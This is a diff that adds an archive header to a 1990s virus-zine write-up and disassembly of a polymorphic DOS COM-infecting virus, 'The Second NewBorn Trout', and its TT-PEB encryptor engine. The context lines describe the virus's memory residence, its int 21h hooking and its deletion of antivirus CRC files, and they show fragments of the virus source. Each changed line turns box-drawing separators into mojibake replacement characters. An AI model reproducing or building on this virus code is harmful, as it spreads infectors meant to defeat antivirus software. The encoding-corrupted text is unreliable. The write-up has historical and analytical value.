@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
                      Virus spotlite:  The Second NewBorn Trout
                              by b0z0/iKX, Padania 1997
 
@@ -10,7 +21,7 @@ Type            : Direct action/TSR, Poly, COM infector, Retro
 Lenght          : 6804 on disk (19967 in memory)
 
 Introduction:
-ÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
  This is a quite old, but interesting virus from North Italy. Its main point
 of interest is undoubtely the good polymorphic engine that can generate a lot
 of different types of garbage instructions, including fake interrupt calls
@@ -19,7 +30,7 @@ sound sorta normal nowadays, but for the past days in 1995 it was a great
 engine, maybe one of the best around as some AVers stated at the time.
 
 Virus description:
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
  As it is quite usual the virus will shrink the last MCB and place itself
 there. Of course it will then hook interrupt 21h, but instead of pointing
 from the IVT directly to the virus handler it will put in the IVT the adress
@@ -75,7 +86,7 @@ memory. So the virus will decrypt and reinstall itself again in memory.
 known CRC files of the most common antiviruses.
 
 Poly engine description:
-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
  As already said the poly engine, the "Tricky Trout Plurimorphic Encryptor
 Builder" (shortly TT-PEB) is very interesting. The version used here is the
 2.01, but I don't know of other versions before this one. The TT-PEB is
@@ -161,7 +172,7 @@ assignation of the pointer (since before it just put the assignation valid
 for execution in memory).
 
 The disasm:
-ÄÄÄÄÄÄÄÄÄÄÄ
+ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
  Here you have the entire disasm of the virus and of the TT-PEB. Some parts
 like the garbage generation routines aren't fully commented since they are
 quite simple to understand for the average poly coder. Also I left out many
@@ -175,16 +186,16 @@ TLINK /t 2trout.obj
 Enjoy!
 
 
-;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
-;ÛÛ					                                 ÛÛ
-;ÛÛ                       The Second NewBorn Trout                       ÛÛ
-;ÛÛ                      Written by The Tricky Trout                     ÛÛ
-;ÛÛ                        Milan, North Italy 1995                       ÛÛ
-;ÛÛ                                                                      ÛÛ
-;ÛÛ                          Disasm by b0z0/iKX                          ÛÛ
-;ÛÛ                             Padania 1997                             ÛÛ
-;ÛÛ                                                                      ÛÛ
-;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;ï¿½ï¿½					                                 ï¿½ï¿½
+;ï¿½ï¿½                       The Second NewBorn Trout                       ï¿½ï¿½
+;ï¿½ï¿½                      Written by The Tricky Trout                     ï¿½ï¿½
+;ï¿½ï¿½                        Milan, North Italy 1995                       ï¿½ï¿½
+;ï¿½ï¿½                                                                      ï¿½ï¿½
+;ï¿½ï¿½                          Disasm by b0z0/iKX                          ï¿½ï¿½
+;ï¿½ï¿½                             Padania 1997                             ï¿½ï¿½
+;ï¿½ï¿½                                                                      ï¿½ï¿½
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 virus_length    equ     (offset tsnbt_fend - offset tsnbt_start)
 virus_mem       equ     (offset mem_end - offset tsnbt_start)
@@ -1088,7 +1099,7 @@ jump_ss2        dw      00h                     ; will delete the clear body
                                                 ; from memory and then execute
                                                 ; the int 21h
 
-;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;
 ;       TT-PEB (Tricky Trout Plurimorphic Encryptor Builder) v 2.01
 ;
@@ -1114,7 +1125,7 @@ jump_ss2        dw      00h                     ; will delete the clear body
 ;       CX     = Length of generated code
 ;       DS:DX  = Pointer on generated code
 ;
-;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 poly_marker     db      '[TT-PEB]'
 
@@ -1354,7 +1365,7 @@ body_encrypted:
 
                 retn                            ; TT-PEB ending point
 
-;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 regs_set:
 ;
@@ -1815,7 +1826,7 @@ make_cond_jump:
 		retn
 
 
-;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 ; Creates the JMP back to the start of the decryption loop
 jump_back:
@@ -1831,7 +1842,7 @@ jump_back:
 		retn
 
 
-;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 ; Get the number of random instructions to generate depending on given
 ; option to TT-PEB in AX
